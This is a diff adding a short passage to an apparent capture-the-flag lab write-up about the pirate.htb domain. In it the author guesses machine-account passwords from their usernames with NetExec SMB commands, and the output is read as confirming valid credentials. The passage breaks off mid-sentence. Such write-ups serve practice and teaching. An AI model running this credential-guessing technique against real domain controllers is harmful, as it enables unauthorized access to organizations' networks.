@@ -176,5 +176,15 @@ After seeing several machine accounts, i figured it was worth checking, looks li
 
 However nxc is unable to get TGTs cause of the clock skew which is fine since i should be able to guess their password based off their username
 
+```python
+nxc smb dc01.pirate.htb -u 'ms01$' -p 'ms01'                  
+SMB         10.129.244.95   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.244.95   445    DC01             [-] pirate.htb\ms01$:ms01 STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
 
+nxc smb dc01.pirate.htb -u 'exch01$' -p 'exch01'
+SMB         10.129.244.95   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.244.95   445    DC01             [-] pirate.htb\exch01$:exch01 STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
+```
+
+Both credentials are valid however 
 
